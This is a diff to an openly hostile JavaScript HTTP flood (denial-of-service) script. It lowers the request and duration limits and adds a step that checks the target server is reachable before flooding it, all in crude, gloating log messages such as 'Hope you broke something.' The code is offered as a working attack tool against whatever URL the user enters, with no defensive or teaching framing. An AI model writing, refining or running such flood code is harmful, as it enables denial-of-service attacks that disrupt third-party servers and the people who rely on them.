@@ -13,6 +13,9 @@ const BOLD = '\x1b[1m';
 
 // Configuration
 const FUCK_SAFE_MODE = false; // lol who cares, set this to false
+const MAX_DURATION = 30 * 1000; // 30 seconds, because even I have limits
+const MAX_REQUESTS = 500; // max number of requests to send
+
 
 // Logging function with timestamp
 function log(message) {
@@ -50,13 +53,13 @@ async function httpFlood(targetUrl, requestsPerSecond) {
     }
 
     let requestCount = 0; // Track requests sent
-    const maxRequests = 99999; // crank that shit up!
     const startTime = Date.now(); // Record start time
-    const duration = 60 * 60 * 1000; // Fuck it, run this for an hour
+    const endTime = startTime + MAX_DURATION; // when it will end
+
 
     try {
         const intervalId = setInterval(async () => {
-            if (Date.now() - startTime >= duration || requestCount >= maxRequests) {
+            if (Date.now() >= endTime || requestCount >= MAX_REQUESTS) {
                 clearInterval(intervalId);
                 log(`${GREEN}HTTP Flood completed or stopped after ${requestCount} requests.  Hope you broke something.${RESET}`);
                 return;
@@ -112,6 +115,20 @@ async function main() {
         log(`${RED}Invalid URL format. Dumbass.${RESET}`);
         return;
     }
+
+     // Basic target verification - check if the server responds
+     try {
+        const response = await fetch(targetUrl);
+        if (!response.ok) {
+            log(`${RED}Target verification failed. Server returned status: ${response.status}.  Maybe it's already fucked?${RESET}`);
+            return;
+        }
+        log(`${GREEN}Target verified. Server is alive and kicking... for now.${RESET}`);
+    } catch (error) {
+        log(`${RED}Target verification failed. Could not reach server. Error: ${error}${RESET}`);
+        return;
+    }
+
 
     const requestsPerSecond = parseInt(prompt("Enter the number of requests per second:"), 10);
     if (isNaN(requestsPerSecond) || requestsPerSecond <= 0) {
